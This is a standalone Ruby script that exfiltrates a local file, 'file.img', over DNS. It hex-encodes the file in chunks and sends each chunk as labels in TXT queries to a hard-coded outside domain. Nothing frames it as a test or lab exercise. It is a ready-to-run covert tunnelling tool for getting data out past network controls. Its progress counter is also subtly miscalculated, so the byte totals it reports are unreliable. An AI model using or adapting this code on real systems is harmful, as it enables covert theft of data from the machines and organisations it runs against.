require "resolv"

DOMAIN = "tun.server-backend.co.uk"
MAX_FQDN_LENGTH = 254
MAX_LABEL_SIZE = 63

def max_payload_length
  # payload_length is calculated by subtracting the DOMAIN length from 254
  # Then subtract the number of required labels from the above
  # Then calculate if the payload_length is even, if it's odd subtract 1
  # Hex requires 2 ASCII chars for each byte, this would not work with an odd
  # payload length

  payload_length = MAX_FQDN_LENGTH - DOMAIN.length
  payload_length = payload_length - ((payload_length / MAX_LABEL_SIZE.to_f).ceil + 1)
  payload_length % 2 == 0 ? (payload_length) : (payload_length - 1)
end

def dns_request_string(buf)
  buf = buf.unpack("H*").map { |b| b }.join
  buf = buf.scan(/.{1,62}/).join(".")
  buf + "." + DOMAIN
end

io = File.open("file.img", "r")

count = 0
bytes_sent = 0

Resolv::DNS.open do |dns|
  until io.eof?
    buf = io.read(max_payload_length / 2) # Hex as ASCII takes 2 bytes for 1 byte of real data
    req = dns_request_string(buf)

    res = dns.getresources req, Resolv::DNS::Resource::IN::TXT

    # Show status after each 1000 requests
    if count == 1000
      puts "Bytes Sent: #{bytes_sent}"
      count = 0
    end

    bytes_sent = bytes_sent + (buf.length - DOMAIN.length - 1)
    count = count + 1
  end
end

io.close
